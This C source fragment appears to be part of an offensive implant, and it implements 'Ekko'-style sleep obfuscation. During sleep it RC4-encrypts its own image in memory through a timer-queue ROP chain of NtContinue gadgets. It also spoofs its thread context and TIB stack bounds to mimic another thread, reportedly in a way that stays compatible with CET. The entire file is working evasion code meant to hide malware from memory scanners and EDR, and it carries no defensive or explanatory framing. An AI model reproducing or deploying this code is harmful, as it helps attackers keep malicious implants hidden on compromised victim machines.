#ifdef SLEEP_OBF_EKKO

VOID EkkoObf(HOOK_TYPE Hook, HOOK_ARGS *Args)
{
    ULONG CurrentTid = KERNEL32$GetCurrentThreadId();
    ULONG SpoofTid   = RndThreadId(CurrentTid);

    StealthDbg("starting: CurrentTid=%lu SpoofTid=%lu\n", CurrentTid, SpoofTid);

    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    /* 14 ROP frames: 0=gate, 1=VP_RW, 2=encrypt, 3=GetCtx, 4=CopyRip,
       5=CopyTib, 6=SetCtx, 7=sleep, 8=RestoreTib, 9=SetCtxRestore,
       10=decrypt, 11=restorePerms, 12=setEvent */
    CONTEXT CtxThread;
    CONTEXT Rop[14];
    CONTEXT CtxSpf;
    CONTEXT CtxCap;
    int     Inc       = 0;

    NT_TIB  TibSpoof;
    NT_TIB  TibBackup;

    HANDLE hTimerQueue = NULL;
    HANDLE hNewTimer   = NULL;
    HANDLE hEvtCapture = NULL;
    HANDLE hEvtStart   = NULL;
    HANDLE hEvtEnd     = NULL;
    DWORD  OldProtect  = 0;
    DWORD  DelayTimer  = 0;

    CHAR KeyBuf[16];
    USTRING Key;
    USTRING Img;

    MSVCRT$memset(&CtxThread, 0, sizeof(CONTEXT));
    MSVCRT$memset(Rop, 0, sizeof(CONTEXT) * 14);
    MSVCRT$memset(&CtxSpf, 0, sizeof(CONTEXT));
    MSVCRT$memset(&CtxCap, 0, sizeof(CONTEXT));
    MSVCRT$memset(&TibSpoof, 0, sizeof(NT_TIB));
    MSVCRT$memset(&TibBackup, 0, sizeof(NT_TIB));
    MSVCRT$memset(KeyBuf, 0x55, 16);
    MSVCRT$memset(&Key, 0, sizeof(USTRING));
    MSVCRT$memset(&Img, 0, sizeof(USTRING));

    if (!g_ImageBase || !g_ImageSize || !g_pNtContinue || !g_pRtlCaptureContext || !g_pSysFunc032) {
        StealthDbg("ERROR: missing prereqs\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    Key.Buffer = KeyBuf;         Key.Length = Key.MaximumLength = 16;
    Img.Buffer = g_ImageBase;    Img.Length = Img.MaximumLength = g_ImageSize;

    StealthDbg("image region: base=%p size=0x%lx\n", g_ImageBase, (unsigned long)g_ImageSize);

    /* ── Open spoof + main thread handles ─────────────────────────── */
    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, SpoofTid);
    StealthDbg("spoof thread: TID=%lu handle=%p\n", SpoofTid, DupThreadHandle);

    KERNEL32$DuplicateHandle(
        NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(),
        &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0);
    if (!MainThreadHandle) {
        StealthDbg("ERROR: DuplicateHandle failed\n");
        HandleUnexpectedError(Hook, Args);
        return;
    }

    /* ── Sync objects ─────────────────────────────────────────────── */
    hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hEvtStart   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hEvtEnd     = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    hTimerQueue = KERNEL32$CreateTimerQueue();

    if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
        StealthDbg("ERROR: failed to create sync objects or timer queue\n");
        if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
        if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
        if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
        if (hEvtStart)   KERNEL32$CloseHandle(hEvtStart);
        if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
        if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
        HandleUnexpectedError(Hook, Args);
        return;
    }

    /* ── Capture spoof thread context (for RSP/stack) ─────────────── */
    CtxSpf.ContextFlags = CONTEXT_FULL;
    if (DupThreadHandle) {
        KERNEL32$GetThreadContext(DupThreadHandle, &CtxSpf);
        StealthDbg("CtxSpf: Rip=0x%llx Rsp=0x%llx\n",
            (unsigned long long)CtxSpf.Rip, (unsigned long long)CtxSpf.Rsp);
    }

    /* ── Get spoof thread's NT_TIB (stack bounds) ─────────────────── */
    if (DupThreadHandle) {
        THREAD_BASIC_INFORMATION tbi = { 0 };
        NTDLL$NtQueryInformationThread(DupThreadHandle, 0, &tbi, sizeof(tbi), NULL);
        if (tbi.TebBaseAddress) {
            MSVCRT$memcpy(&TibSpoof, tbi.TebBaseAddress, sizeof(NT_TIB));
            StealthDbg("SpoofTIB: StackBase=%p StackLimit=%p\n",
                TibSpoof.StackBase, TibSpoof.StackLimit);
        }
    }

    /* ── Backup main thread's NT_TIB ──────────────────────────────── */
    PVOID pTeb = NULL;
#if defined(_M_X64)
    __asm__ volatile ("movq %%gs:0x30, %0" : "=r" (pTeb));
#elif defined(_M_IX86)
    __asm__ volatile ("movl %%fs:0x18, %0" : "=r" (pTeb));
#endif
    NT_TIB *pMainTib = (NT_TIB *)pTeb;
    MSVCRT$memcpy(&TibBackup, pMainTib, sizeof(NT_TIB));
    StealthDbg("MainTIB: StackBase=%p StackLimit=%p TEB=%p\n",
        TibBackup.StackBase, TibBackup.StackLimit, pTeb);

    /* ── Prepare CtxCap for capturing main thread context at runtime ── */
    CtxCap.ContextFlags = CONTEXT_FULL;

    /* ── Capture timer thread context ─────────────────────────────── */
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)g_pRtlCaptureContext, &CtxThread, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)KERNEL32$SetEvent, hEvtCapture, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);

    KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);
    StealthDbg("timer ctx: Rip=0x%llx Rsp=0x%llx\n",
        (unsigned long long)CtxThread.Rip, (unsigned long long)CtxThread.Rsp);

    /* ── Clone base context into all ROP frames ───────────────────── */
    for (int i = 0; i < 14; i++) {
        MSVCRT$memcpy(&Rop[i], &CtxThread, sizeof(CONTEXT));
        Rop[i].Rsp -= 8;
    }

    /* jmp [rbx] indirection table */
    PVOID fn_WaitForSingleObject    = (PVOID)g_pWaitForSingleObject;
    PVOID fn_GetThreadContext       = (PVOID)g_pGetThreadContext;
    PVOID fn_SetThreadContext       = (PVOID)g_pSetThreadContext;
    PVOID fn_VirtualProtect         = (PVOID)g_pVirtualProtect;
    PVOID fn_SysFunc032             = (PVOID)g_pSysFunc032;
    PVOID fn_WaitForSingleObjectEx  = (PVOID)g_pWaitForSingleObjectEx;
    PVOID fn_SetEvent               = (PVOID)g_pSetEvent;
    PVOID fn_RestorePerms           = (PVOID)restore_section_permissions;
    PVOID fn_Delay                  = NULL;
    PVOID fn_DetourWaitMulti        = (PVOID)DetourWaitForMultipleObjects;
    PVOID fn_Memcpy                 = (PVOID)g_pRtlMoveMemory;

    Inc = 0;

    /* ── ROP 0: gate - WaitForSingleObject(hEvtStart) ─────────────── */
    StealthDbg("building ROP %d: WaitForSingleObject(hEvtStart)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_WaitForSingleObject;
    Rop[Inc].Rcx = (DWORD64)hEvtStart;
    Rop[Inc].Rdx = (DWORD64)INFINITE;
    Inc++;

    /* ── ROP 1: VirtualProtect(image → RW) ────────────────────────── */
    StealthDbg("building ROP %d: VirtualProtect(RW)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_VirtualProtect;
    Rop[Inc].Rcx = (DWORD64)g_ImageBase;
    Rop[Inc].Rdx = (DWORD64)g_ImageSize;
    Rop[Inc].R8  = PAGE_READWRITE;
    Rop[Inc].R9  = (DWORD64)&OldProtect;
    Inc++;

    /* ── ROP 2: RC4 encrypt ───────────────────────────────────────── */
    StealthDbg("building ROP %d: SystemFunction032 (encrypt)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_SysFunc032;
    Rop[Inc].Rcx = (DWORD64)&Img;
    Rop[Inc].Rdx = (DWORD64)&Key;
    Inc++;

    /* ── ROP 3: GetThreadContext(MainThread, &CtxCap) - capture real RIP ── */
    StealthDbg("building ROP %d: GetThreadContext (capture main RIP)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_GetThreadContext;
    Rop[Inc].Rcx = (DWORD64)MainThreadHandle;
    Rop[Inc].Rdx = (DWORD64)&CtxCap;
    Inc++;

    /* ── ROP 4: memcpy(&CtxSpf.Rip, &CtxCap.Rip, 8) - preserve RIP for CET ── */
    StealthDbg("building ROP %d: memcpy (copy main RIP into spoof ctx)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_Memcpy;
    Rop[Inc].Rcx = (DWORD64)&CtxSpf.Rip;
    Rop[Inc].Rdx = (DWORD64)&CtxCap.Rip;
    Rop[Inc].R8  = (DWORD64)sizeof(DWORD64);
    Inc++;

    /* ── ROP 5: memcpy(&Teb->NtTib, &TibSpoof, sizeof(NT_TIB)) - swap stack bounds ── */
    StealthDbg("building ROP %d: memcpy (swap NtTib to spoof)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_Memcpy;
    Rop[Inc].Rcx = (DWORD64)pMainTib;
    Rop[Inc].Rdx = (DWORD64)&TibSpoof;
    Rop[Inc].R8  = (DWORD64)sizeof(NT_TIB);
    Inc++;

    /* ── ROP 6: SetThreadContext(MainThread, &CtxSpf) - CET safe: RIP unchanged ── */
    StealthDbg("building ROP %d: SetThreadContext (spoof - RIP preserved)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_SetThreadContext;
    Rop[Inc].Rcx = (DWORD64)MainThreadHandle;
    Rop[Inc].Rdx = (DWORD64)&CtxSpf;
    Inc++;

    /* ── ROP 7: sleep / hook dispatch ─────────────────────────────── */
    switch (Hook) {
    case WAIT_FOR_SINGLE_OBJECT_EX:
        StealthDbg("building ROP %d: WaitForSingleObjectEx (sleep %lums)\n",
            Inc, (unsigned long)Args->WaitForSingleObjectExArgs.dwMilliseconds);
        fn_Delay = (PVOID)fn_WaitForSingleObjectEx;
        Rop[Inc].Rip = (DWORD64)g_JmpGadget;
        Rop[Inc].Rbx = (DWORD64)&fn_Delay;
        Rop[Inc].Rcx = (DWORD64)Args->WaitForSingleObjectExArgs.hObject;
        Rop[Inc].Rdx = (DWORD64)Args->WaitForSingleObjectExArgs.dwMilliseconds;
        Rop[Inc].R8  = (DWORD64)Args->WaitForSingleObjectExArgs.bAlertable;
        break;
    case WAIT_FOR_MULTIPLE_OBJECTS:
        StealthDbg("building ROP %d: WaitForMultipleObjects (detour)\n", Inc);
        Rop[Inc].Rip = (DWORD64)g_JmpGadget;
        Rop[Inc].Rbx = (DWORD64)&fn_DetourWaitMulti;
        Rop[Inc].Rcx = (DWORD64)&Args->WaitForMultipleObjectsArgs;
        break;
    case CONNECT_NAMED_PIPE:
        StealthDbg("building ROP %d: ConnectNamedPipe (detour)\n", Inc);
        Rop[Inc].Rip = (DWORD64)g_JmpGadget;
        Rop[Inc].Rbx = (DWORD64)&Args->ConnectNamedPipeArgs.OriginalFunc;
        Rop[Inc].Rcx = (DWORD64)Args->ConnectNamedPipeArgs.hPipe;
        Rop[Inc].Rdx = (DWORD64)Args->ConnectNamedPipeArgs.lpOverlapped;
        break;
    default:
        StealthDbg("ERROR: unknown hook type %d\n", Hook);
    }
    Inc++;

    /* ── ROP 8: memcpy(&Teb->NtTib, &TibBackup, sizeof(NT_TIB)) - restore stack bounds ── */
    StealthDbg("building ROP %d: memcpy (restore NtTib)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_Memcpy;
    Rop[Inc].Rcx = (DWORD64)pMainTib;
    Rop[Inc].Rdx = (DWORD64)&TibBackup;
    Rop[Inc].R8  = (DWORD64)sizeof(NT_TIB);
    Inc++;

    /* ── ROP 9: SetThreadContext(MainThread, &CtxCap) - restore original context ── */
    StealthDbg("building ROP %d: SetThreadContext (restore)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_SetThreadContext;
    Rop[Inc].Rcx = (DWORD64)MainThreadHandle;
    Rop[Inc].Rdx = (DWORD64)&CtxCap;
    Inc++;

    /* ── ROP 10: RC4 decrypt ──────────────────────────────────────── */
    StealthDbg("building ROP %d: SystemFunction032 (decrypt)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_SysFunc032;
    Rop[Inc].Rcx = (DWORD64)&Img;
    Rop[Inc].Rdx = (DWORD64)&Key;
    Inc++;

    /* ── ROP 11: restore_section_permissions ───────────────────────── */
    StealthDbg("building ROP %d: restore_section_permissions\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_RestorePerms;
    Inc++;

    /* ── ROP 12: SetEvent(hEvtEnd) - signal done ──────────────────── */
    StealthDbg("building ROP %d: SetEvent(hEvtEnd)\n", Inc);
    Rop[Inc].Rip = (DWORD64)g_JmpGadget;
    Rop[Inc].Rbx = (DWORD64)&fn_SetEvent;
    Rop[Inc].Rcx = (DWORD64)hEvtEnd;
    Inc++;

    /* ── Queue all timers ─────────────────────────────────────────── */
    StealthDbg("queuing %d timer-based ROP frames (gadget=0x%llx)\n",
        Inc, (unsigned long long)g_NtContinueGadget);
    for (int i = 0; i < Inc; i++) {
        KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue,
            (WAITORTIMERCALLBACK)g_NtContinueGadget, &Rop[i],
            DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    }

    /* ── Fire the chain ──────────────────────────────────────────── */
    StealthDbg("firing ROP chain via SetEvent(hEvtStart)\n");
    KERNEL32$SetEvent(hEvtStart);

    StealthDbg("blocking on hEvtEnd (waiting for chain to complete)\n");
    KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);

    StealthDbg("chain complete - cleaning up handles\n");
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    KERNEL32$CloseHandle(hEvtCapture);
    KERNEL32$CloseHandle(hEvtStart);
    KERNEL32$CloseHandle(hEvtEnd);
    KERNEL32$DeleteTimerQueue(hTimerQueue);
    StealthDbg("done\n");
}

#endif /* SLEEP_OBF_EKKO */